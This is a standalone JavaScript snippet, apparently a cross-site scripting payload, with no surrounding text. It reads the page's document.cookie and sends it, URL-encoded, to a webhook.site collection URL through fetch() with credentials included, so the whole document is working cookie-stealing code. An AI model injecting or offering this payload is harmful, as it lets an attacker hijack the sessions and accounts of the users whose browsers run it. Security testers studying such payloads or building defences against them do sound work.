fetch('https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?data=' + encodeURIComponent(document.cookie), {
  method: 'GET',
  mode: 'cors',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include'
});
